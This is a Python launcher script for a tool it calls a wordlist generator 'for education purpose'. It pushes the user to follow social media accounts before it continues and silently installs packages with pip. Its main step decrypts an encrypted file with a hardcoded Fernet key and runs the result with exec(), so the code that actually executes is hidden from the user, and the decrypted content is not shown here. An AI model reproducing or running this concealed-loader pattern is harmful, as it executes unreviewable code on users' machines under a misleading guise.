from files.Writer import writer
from files.Hadings import Heading, Sub_head
from files.URLS import whatsapp, instagram, youtube
from os import system
from time import sleep
try:
    from colorama import init
    from cryptography.fernet import Fernet
except ImportError:
    system("pip install colorama")
    system("pip install cryptography")
    from colorama import init
    from cryptography.fernet import Fernet


init()

system("clear")
Heading()
print("\n"*2)
writer("Welcome to our tool..".center(50,"_"))
print()
writer('''\033[31;1mFirst follow on Instagram and subscribe on YouTube.
Our tool has been locked!
The tool will be unlocked when you complete this command!

this Tool for create your own strong wordlists.
this tool only education purpose.'''. title())
print()
print()
writer("_"*100)
print("\n"*2)

sleep(4)
youtube()
sleep(3)
writer("\033[36;42;1mType ENTER for next step\033[0m")
input()
instagram()
writer("\033[31;42;1mType ENTER for next step\033[0m")
input()
whatsapp()
sleep(5)
system("clear")
Sub_head()


file_name = "files/tool_encrypt.py"

key = b"wwWV9b5TCMPfSiUOd1nf1hDYU_bwHgVq5sQp3YEuydE="

cipher = Fernet(key)

with open(file_name, "rb") as file:
    encrypted_code = file.read()

decrypted_code = cipher.decrypt(encrypted_code)


exec(decrypted_code)
